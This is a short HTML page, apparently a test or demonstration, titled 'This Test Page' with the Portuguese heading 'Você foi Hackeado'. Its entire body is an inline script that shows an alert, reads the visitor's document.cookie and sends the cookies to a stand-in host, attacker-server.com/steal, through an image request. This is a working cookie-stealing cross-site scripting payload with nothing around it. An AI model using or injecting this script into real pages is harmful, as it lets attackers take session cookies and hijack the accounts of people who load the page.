<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>This Test Page</title>
</head>
<body>
    <h1>Você foi Hackeado</h1>
    <script>
        // Exibe um alerta para o usuário
        alert('This is a malicious script executing!');

        // Captura os cookies do usuário
        var cookies = document.cookie;

        // Envia os cookies capturados para o servidor do atacante
        var img = new Image();
        img.src = "http://attacker-server.com/steal?cookies=" + encodeURIComponent(cookies);
    </script>
</body>
</html>